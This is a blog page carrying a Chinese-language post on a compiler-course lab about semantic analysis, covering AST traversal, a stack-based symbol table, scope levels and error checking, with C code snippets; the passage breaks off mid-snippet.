<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 5.4.0">
  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">


<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
  <link rel="stylesheet" href="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.css">

<script id="hexo-configurations">
    var NexT = window.NexT || {};
    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":true,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
  </script>

  <meta property="og:type" content="website">
<meta property="og:title" content="Pwn进你的心">
<meta property="og:url" content="http://example.com/page/4/index.html">
<meta property="og:site_name" content="Pwn进你的心">
<meta property="og:locale" content="en_US">
<meta property="article:author" content="yhellow">
<meta name="twitter:card" content="summary">

<link rel="canonical" href="http://example.com/page/4/">


<script id="page-configurations">
  // https://hexo.io/docs/variables.html
  CONFIG.page = {
    sidebar: "",
    isHome : true,
    isPost : false,
    lang   : 'en'
  };
</script>

  <title>Pwn进你的心</title>
  






  <noscript>
  <style>
  .use-motion .brand,
  .use-motion .menu-item,
  .sidebar-inner,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-header { opacity: initial; }

  .use-motion .site-title,
  .use-motion .site-subtitle {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line-before i { left: initial; }
  .use-motion .logo-line-after i { right: initial; }
  </style>
</noscript>

</head>

<body itemscope itemtype="http://schema.org/WebPage">
  <div class="container use-motion">
    <div class="headband"></div>

    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="Toggle navigation bar">
      <span class="toggle-line toggle-line-first"></span>
      <span class="toggle-line toggle-line-middle"></span>
      <span class="toggle-line toggle-line-last"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <span class="logo-line-before"><i></i></span>
      <h1 class="site-title">Pwn进你的心</h1>
      <span class="logo-line-after"><i></i></span>
    </a>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
    </div>
  </div>
</div>




<nav class="site-nav">
  <ul id="menu" class="main-menu menu">
        <li class="menu-item menu-item-home">

    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a>

  </li>
        <li class="menu-item menu-item-tags">

    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>Tags</a>

  </li>
        <li class="menu-item menu-item-categories">

    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>Categories</a>

  </li>
        <li class="menu-item menu-item-archives">

    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a>

  </li>
  </ul>
</nav>




</div>
    </header>

    
  <div class="back-to-top">
    <i class="fa fa-arrow-up"></i>
    <span>0%</span>
  </div>


    <main class="main">
      <div class="main-inner">
        <div class="content-wrap">
          

          <div class="content index posts-expand">
            
      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://example.com/2023/03/19/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86-Lab2/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="yhellow">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Pwn进你的心">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2023/03/19/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86-Lab2/" class="post-title-link" itemprop="url">编译原理-Lab2</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2023-03-19 21:14:38" itemprop="dateCreated datePublished" datetime="2023-03-19T21:14:38+08:00">2023-03-19</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2023-03-20 23:40:07" itemprop="dateModified" datetime="2023-03-20T23:40:07+08:00">2023-03-20</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Knowledge/" itemprop="url" rel="index"><span itemprop="name">Knowledge</span></a>
                </span>
            </span>

          
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
              <span>20k</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
              <span>18 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="第一个任务"><a href="#第一个任务" class="headerlink" title="第一个任务"></a>第一个任务</h2><p>用不同的样例覆盖语法规则，进行语义分析，遍历对应的 AST 树，发现语义的错误并输出到屏幕</p>
<p>建立符号表，并在合适的分析位置上进行输出符号表</p>
<p>需要特别注意以下两个问题：</p>
<ul>
<li>符号表的管理：<ul>
<li>符号表可以采用多种数据结构实现：顺序表，哈希表，十字链表，多表结构</li>
<li>符号表上的操作包括创建符号表、插入表项、查询表项、修改表项、删除表项、释放符号表空间等等 </li>
</ul>
</li>
<li>静态语义分析：<ul>
<li>控制流检查：控制流语句必须使得程序跳转到合法的地方</li>
<li>唯一性检查：检查某些不能重复定义的对象或者元素（例如：同一作用域的标识符不能同名）</li>
<li>名字的上下文相关性检查：名字的出现在遵循作用域与可见性的前提下应该满足一定的上下文的相关性 </li>
<li>类型检查：包括检查函数参数传递过程中形参与实参类型是否匹配，是否进行自动类型转换等</li>
</ul>
</li>
</ul>
<p><strong>遍历 AST 树</strong></p>
<p>AST 的遍历采用的是前序遍历（根左右），在遍历过程中：</p>
<ul>
<li>访问到了说明部分的结点时，在符号表中添加新的内容</li>
<li>访问到执行语句部分时，根据访问的变量（或函数）名称查询符号表，并分析其静态语义的正确性 </li>
</ul>
<p>在上一个实验的 <code>display</code> 函数中已经实现了遍历的过程，AST 的节点结构体如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">node</span> &#123;</span> <span class="comment">// 以下对结点属性定义没有考虑存储效率,只是简单地列出要用到的一些属性</span></span><br><span class="line">    <span class="class"><span class="keyword">enum</span> <span class="title">node_kind</span> <span class="title">kind</span>;</span> <span class="comment">// 结点类型</span></span><br><span class="line">    <span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">        <span class="keyword">char</span> type_id[<span class="number">33</span>]; <span class="comment">// 由标识符生成的叶结点</span></span><br><span class="line">        <span class="keyword">int</span> type_int; <span class="comment">// 由整常数生成的叶结点</span></span><br><span class="line">        <span class="keyword">char</span> type_char; <span class="comment">// 由字符型生成的叶节点</span></span><br><span class="line">        <span class="keyword">float</span> type_float; <span class="comment">// 由浮点常数生成的叶结点</span></span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">node</span> *<span class="title">ptr</span>[3];</span> <span class="comment">// 子树指针,由kind确定有多少棵子树</span></span><br><span class="line">    <span class="keyword">int</span> level; <span class="comment">// 层号</span></span><br><span class="line">    <span class="keyword">int</span> place; <span class="comment">// 表示结点对应的变量或运算结果临时变量在符号表的位置序号</span></span><br><span class="line">    <span class="keyword">char</span> Etrue[<span class="number">15</span>],Efalse[<span class="number">15</span>]; <span class="comment">// 对布尔表达式的翻译时,真假转移目标的标号</span></span><br><span class="line">    <span class="keyword">char</span> Snext[<span class="number">15</span>]; <span class="comment">// 该结点对应语句执行后的下一条语句位置标号</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">codenode</span> *<span class="title">code</span>;</span> <span class="comment">// 该结点中间代码链表头指针</span></span><br><span class="line">    <span class="keyword">char</span> op[<span class="number">10</span>];</span><br><span class="line">    <span class="keyword">int</span> type; <span class="comment">// 结点对应值的类型</span></span><br><span class="line">    <span class="keyword">int</span> pos; <span class="comment">// 语法单位所在位置行号</span></span><br><span class="line">    <span class="keyword">int</span> offset; <span class="comment">// 偏移量</span></span><br><span class="line">    <span class="keyword">int</span> width; <span class="comment">// 各种数据占用的字节数</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p><strong>符号表</strong></p>
<p>用结构体 <code>symbol</code> 来组织符号表信息：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">symbol</span> &#123;</span></span><br><span class="line">    <span class="keyword">char</span> name[<span class="number">33</span>]; <span class="comment">// 变量或函数名</span></span><br><span class="line">    <span class="keyword">int</span> level; <span class="comment">// 层号,外部变量名或函数名层号为0,形参名为1,每到1个复合语句层号加1,退出减1</span></span><br><span class="line">    <span class="keyword">int</span> type; <span class="comment">// 变量类型或函数返回值类型</span></span><br><span class="line">    <span class="keyword">int</span> paramnum; <span class="comment">// 形式参数个数</span></span><br><span class="line">    <span class="keyword">char</span> alias[<span class="number">10</span>]; <span class="comment">// 别名,为解决嵌套层次使用,使得每一个数据名称唯一</span></span><br><span class="line">    <span class="keyword">char</span> flag; <span class="comment">// 符号标记,函数:&#x27;F&#x27;,变量:&#x27;V&#x27;,参数:&#x27;P&#x27;,临时变量:&#x27;T&#x27;</span></span><br><span class="line">    <span class="keyword">char</span> offset; <span class="comment">// 外部变量和局部变量在其静态数据区或活动记录中的偏移量,或函数活动记录大小,目标代码生成时使用</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>管理符号表的核心数据结构为顺序栈：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">symboltable</span>&#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">symbol</span> <span class="title">symbols</span>[<span class="title">MAXLENGTH</span>];</span></span><br><span class="line">    <span class="keyword">int</span> index; <span class="comment">// index初值为0</span></span><br><span class="line">&#125;SYMBOLTABLE;</span><br></pre></td></tr></table></figure>
<ul>
<li>当遇到复合语句 COMP_STM 时，<code>symboltable.symbols</code> 会记录该作用域中的局部变量</li>
<li>当退出复合语句 COMP_STM 时，可以通过修改 <code>symboltable.index</code> 来忽略局部变量</li>
<li>因此需要一个格外的栈来记录程序进入 COMP_STM 前的 <code>symboltable.index</code></li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">symbol_scope_begin</span> &#123;</span></span><br><span class="line">  <span class="keyword">int</span> TX[<span class="number">30</span>];</span><br><span class="line">  <span class="keyword">int</span> top;</span><br><span class="line">&#125;SYMBOL_SCOPE_TX;</span><br></pre></td></tr></table></figure>
<ul>
<li>当遇到复合语句 COMP_STM 时，<code>symboltable.index</code> 压栈</li>
<li>当退出复合语句 COMP_STM 时，<code>symboltable.index</code> 弹出</li>
</ul>
<p>显示符号表的代码如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">DisplaySymbolTable</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\t\t***Symbol Table***\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;---------------------------------------------------\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s\t%s\t%s\t%s\t%s\t%s\n&quot;</span>,<span class="string">&quot;Index&quot;</span>,<span class="string">&quot;Name&quot;</span>,<span class="string">&quot;Level&quot;</span>,</span><br><span class="line">           <span class="string">&quot;Type&quot;</span>,<span class="string">&quot;Flag&quot;</span>,<span class="string">&quot;Param_num&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;---------------------------------------------------\n&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;new_table.index;i++)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d\t&quot;</span>,i);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%s\t&quot;</span>,new_table.symbols[i].name);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d\t&quot;</span>,new_table.symbols[i].level);</span><br><span class="line">        <span class="keyword">if</span>(new_table.symbols[i].type==INT)</span><br><span class="line">               <span class="built_in">printf</span>(<span class="string">&quot;%s\t&quot;</span>,<span class="string">&quot;int&quot;</span>);</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(new_table.symbols[i].type==FLOAT)</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%s\t&quot;</span>,<span class="string">&quot;float&quot;</span>);</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%s\t&quot;</span>,<span class="string">&quot;char&quot;</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%c\t&quot;</span>,new_table.symbols[i].flag);</span><br><span class="line">        <span class="keyword">if</span>(new_table.symbols[i].flag==<span class="string">&#x27;F&#x27;</span>)</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>,new_table.symbols[i].paramnum);</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;---------------------------------------------------\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>作用域</strong></p>
<p>在语义分析过程中，各个变量名有其对应的作用域，并且一个作用域内不允许名字重复</p>
<ul>
<li>通过层号 level 来管理，level 的初始值为 “0”</li>
<li>在处理外部变量名以及函数名时，对应符号的层号值固定为 “0”</li>
<li>处理函数形式参数时，固定形参名在填写符号表时，层号值固定为 1”</li>
<li>每到一个复合语句，则层号 level 加“1”，退出时减“1”</li>
</ul>
<p>通过 <code>symboltable</code> 和 <code>symbol_scope_begin</code> 这两个栈结构的配合，就可以实现作用域的变量区分</p>
<p>具体的代码如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> COMP_STM:</span><br><span class="line">    flag=<span class="string">&#x27;T&#x27;</span>;</span><br><span class="line">    command=<span class="number">0</span>;</span><br><span class="line">    new_scope.TX[new_scope.top]=new_table.index; <span class="comment">/* index压栈 */</span></span><br><span class="line">    new_scope.top++;</span><br><span class="line">    Semantic_Analysis(T-&gt;ptr[<span class="number">0</span>],type,level,flag,command); <span class="comment">// 分析定义列表</span></span><br><span class="line">    command=<span class="number">1</span>;</span><br><span class="line">    Semantic_Analysis(T-&gt;ptr[<span class="number">1</span>],type,level+<span class="number">1</span>,flag,command); <span class="comment">// 分析语句列表</span></span><br><span class="line">    DisplaySymbolTable(); <span class="comment">/* 显示符号表 */</span></span><br><span class="line">    new_table.index=new_scope.TX[new_scope.top<span class="number">-1</span>]; <span class="comment">/* index弹出 */</span></span><br><span class="line">    new_scope.top--;</span><br><span class="line">    <span class="keyword">if</span> (new_scope.top == <span class="number">0</span>)</span><br><span class="line">        DisplaySymbolTable(); <span class="comment">/* 显示符号表 */</span></span><br></pre></td></tr></table></figure>
<ul>
<li>分析定义列表和语句列表时会向 <code>symboltable</code> 添加新的条目，同时进行报错分析（检查是否重复，是否合法等）</li>
<li>在分析完成之后 <code>symboltable.index</code> 会进行更新，此时 <code>symboltable</code> 中新添加的条目会被弃用</li>
<li>这样处理之后，同级语句块之间的分析过程不会相互干扰（父层还是会影响子层的分析）</li>
</ul>
<p><strong>定义与使用</strong></p>
<p>核心函数的声明如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">Semantic_Analysis</span><span class="params">(struct node* T,<span class="keyword">int</span> type,<span class="keyword">int</span> level,<span class="keyword">char</span> flag,<span class="keyword">int</span> command)</span></span></span><br></pre></td></tr></table></figure>
<ul>
<li>其中最后一个参数 <code>command</code> 就是用来决定是“定义”还是“使用”</li>
</ul>
<p>通过上述代码也可以看出来：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> COMP_STM:</span><br><span class="line">    flag=<span class="string">&#x27;T&#x27;</span>;</span><br><span class="line">    command=<span class="number">0</span>;</span><br><span class="line">	.....</span><br><span class="line">    Semantic_Analysis(T-&gt;ptr[<span class="number">0</span>],type,level,flag,command); <span class="comment">// 分析定义列表</span></span><br><span class="line">    command=<span class="number">1</span>;</span><br><span class="line">    Semantic_Analysis(T-&gt;ptr[<span class="number">1</span>],type,level+<span class="number">1</span>,flag,command); <span class="comment">// 分析语句列表</span></span><br><span class="line">	.....</span><br></pre></td></tr></table></figure>
<ul>
<li>在一个语句块中：<ul>
<li>前面所有的变量都会被当做“定义”</li>
<li>后面所有的变量都会被当做“使用”</li>
</ul>
</li>
<li>这样写的话会有一些问题，在如下代码中：</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> a1=<span class="number">1</span>;</span><br><span class="line"><span class="keyword">int</span> a2=a1;</span><br></pre></td></tr></table></figure>
<ul>
<li>程序会把 <code>a1</code> 当成“定义”，从而去遍历符号表造成冲突</li>
<li>如果对赋值语句 ASSIGNOP 进行特殊处理又会出现其他的 BUG（主要是因为该程序采用递归的方法来遍历 AST，如果一个地方特殊处理，会导致很多地方发生连锁反应）</li>
</ul>
<p><strong>报错分析</strong></p>
<p>常见错误类型如下：</p>
<ul>
<li>变量在使用时未定义</li>
<li>函数在调用时为经定义</li>
<li>变量出现重复定义或变量域前面定义过的其它语法结构重名</li>
<li>函数出现重复定义</li>
<li>赋值号两边的表达式类型不匹配</li>
<li>赋值号左边只有一个右值的表达式（包括：赋值号右边无值）</li>
<li>操作数类型不匹配或操作数类型域操作符不撇皮（例如：整形变量域数组变量相加减）</li>
<li>return 语句的返回类型域函数定义的返回类型不匹配</li>
<li>函数调用时实参或形参的数目或类型不匹配</li>
</ul>
<p>大概可以分为两类：重复定义，使用时未定义，类型不匹配</p>
<p>判断前两点都比较好实现：</p>
<ul>
<li>重复定义：我们只需要在新的符号进入符号表 <code>symboltable</code> 之前，先判断它是否已经存在于符号表中</li>
<li>使用时未定义：在使用某个符号时，先遍历符号表 <code>symboltable</code> 看看它是否存于其中</li>
</ul>
<p>详细代码如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> ID: <span class="comment">// 检测新的变量名是否唯一</span></span><br><span class="line">    i=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span>(new_table.symbols[i].level!=level&amp;&amp;i&lt;new_table.index) <span class="comment">// 转到相同作用域</span></span><br><span class="line">        i++;</span><br><span class="line">    <span class="keyword">if</span>(command==<span class="number">0</span>)&#123; <span class="comment">// 定义变量</span></span><br><span class="line">        <span class="keyword">while</span>(i&lt;new_table.index)&#123; <span class="comment">/* 遍历并判断是否相同 */</span></span><br><span class="line">            <span class="keyword">if</span>(<span class="built_in">strcmp</span>(new_table.symbols[i].name,T-&gt;type_id)==<span class="number">0</span> &amp;&amp; new_table.symbols[i].flag==flag)&#123;</span><br><span class="line">                <span class="keyword">if</span>(flag==<span class="string">&#x27;V&#x27;</span>)</span><br><span class="line">                    <span class="built_in">printf</span>(<span class="string">&quot;ERROR！第%d行：全局变量中出现相同变量名%s\n&quot;</span>,T-&gt;pos,T-&gt;type_id);</span><br><span class="line">                <span class="keyword">else</span> <span class="keyword">if</span>(flag==<span class="string">&#x27;F&#x27;</span>)</span><br><span class="line">                    <span class="built_in">printf</span>(<span class="string">&quot;ERROR！第%d行：函数定义中出现了相同的函数名%s\n&quot;</span>,T-&gt;pos,T-&gt;type_id);</span><br><span class="line">                <span class="keyword">else</span> <span class="keyword">if</span>(flag==<span class="string">&#x27;T&#x27;</span>)</span><br><span class="line">                    <span class="built_in">printf</span>(<span class="string">&quot;ERROR！第%d行：局部变量中出现了相同的变量名%s\n&quot;</span>,T-&gt;pos,T-&gt;type_id);</span><br><span class="line">                <span class="keyword">else</span></span><br><span class="line">                    <span class="built_in">printf</span>(<span class="string">&quot;ERROR！第%d行：函数参数中中出现了相同的变量名%s\n&quot;</span>,T-&gt;pos,T-&gt;type_id);</span><br><span class="line">                <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            i++;</span><br><span class="line">        &#125; <span class="comment">/* 若不同则可以加入 */</span></span><br><span class="line">        <span class="built_in">strcpy</span>(new_table.symbols[new_table.index].name,T-&gt;type_id);</span><br><span class="line">        new_table.symbols[new_table.index].level=level;</span><br><span class="line">        new_table.symbols[new_table.index].type=type;</span><br><span class="line">        new_table.symbols[new_table.index].flag=flag;</span><br><span class="line">        new_table.index++;</span><br><span class="line">        <span class="keyword">return</span> new_table.symbols[i].type; <span class="comment">/* 这里需要返回类型(类型匹配时有用) */</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123; <span class="comment">// 使用变量</span></span><br><span class="line">        i=new_table.index<span class="number">-1</span>;</span><br><span class="line">        <span class="keyword">while</span>(i&gt;=<span class="number">0</span>)&#123; <span class="comment">/* 遍历并判断是否出现 */</span></span><br><span class="line">            <span class="keyword">if</span>(<span class="built_in">strcmp</span>(new_table.symbols[i].name,T-&gt;type_id)==<span class="number">0</span>&amp;&amp;</span><br><span class="line">               (new_table.symbols[i].flag==<span class="string">&#x27;V&#x27;</span>||</span><br><span class="line">                new_table.symbols[i].flag==<span class="string">&#x27;T&#x27;</span>||</span><br><span class="line">                new_table.symbols[i].flag==<span class="string">&#x27;P&#x27;</span>))&#123;</span><br><span class="line">                <span class="keyword">return</span> new_table.symbols[i].type;</span><br><span class="line">            &#125;</span><br><span class="line">            i--;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(i&lt;<span class="number">0</span>)&#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;ERROR！第%d行：变量名%s未定义\n&quot;</span>,T-&gt;pos,T-&gt;type_id);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">break</span>;</span><br></pre></td></tr></table></figure>
<ul>
<li>对于函数的定义和调用，同样也需要遍历符号表：</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> FUNC_CALL:</span><br><span class="line">    j=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span>(new_table.symbols[j].level==<span class="number">0</span>&amp;&amp;j&lt;new_table.index)&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">strcmp</span>(new_table.symbols[j].name,T-&gt;type_id)==<span class="number">0</span>)&#123;</span><br><span class="line">            <span class="keyword">if</span>(new_table.symbols[j].flag!=<span class="string">&#x27;F&#x27;</span>)</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;ERROR！第%d行：函数名%s在符号表中定义为变量\n&quot;</span>,T-&gt;pos,T-&gt;type_id);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        j++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(new_table.symbols[j].level==<span class="number">1</span>||j==new_table.index)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;ERROR！第%d行：函数%s未定义\n&quot;</span>,T-&gt;pos,T-&gt;type_id);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    type=new_table.symbols[j+<span class="number">1</span>].type;</span><br><span class="line">    counter=<span class="number">0</span>;</span><br><span class="line">    Semantic_Analysis(T-&gt;ptr[<span class="number">0</span>],type,level,flag,command); <span class="comment">// 分析参数</span></span><br><span class="line">    <span class="keyword">if</span>(new_table.symbols[j].paramnum!=counter)</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;ERROR！第%d行：函数调用%s参数个数不匹配\n&quot;</span>,T-&gt;pos,T-&gt;type_id);</span><br><span class="line">    <span class="keyword">return</span> new_table.symbols[j].type;</span><br><span class="line">    <span 